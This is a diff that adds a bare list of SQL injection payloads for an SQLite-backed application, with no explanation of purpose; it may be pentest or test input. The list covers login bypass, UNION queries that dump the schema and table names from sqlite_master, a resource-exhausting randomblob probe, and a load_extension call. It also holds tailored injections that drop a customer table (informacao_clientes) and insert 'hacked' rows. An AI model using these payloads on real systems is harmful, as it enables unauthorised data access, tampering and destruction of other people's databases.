@@ -1,0 +1,10 @@
+' OR 1=1--
+" OR 1=1--
+' UNION SELECT 1,2,3--
+' UNION SELECT name, sql, NULL FROM sqlite_master--
+' OR (SELECT 1 FROM sqlite_master WHERE randomblob(1000000000))--
+' OR (SELECT 1 FROM (SELECT SLEEP(5)))-- (Note: SQLite uses randomblob() for delays)
+' UNION SELECT tbl_name, NULL, NULL FROM sqlite_master WHERE type='table'--
+' OR (SELECT load_extension('invalid.dll'))--
+malicious; DROP TABLE informacao_clientes-- (via NEW_TABLE_NAME)
+attacker_table" (id, nome) VALUES ('hacked', 'data')-- (via table creation)
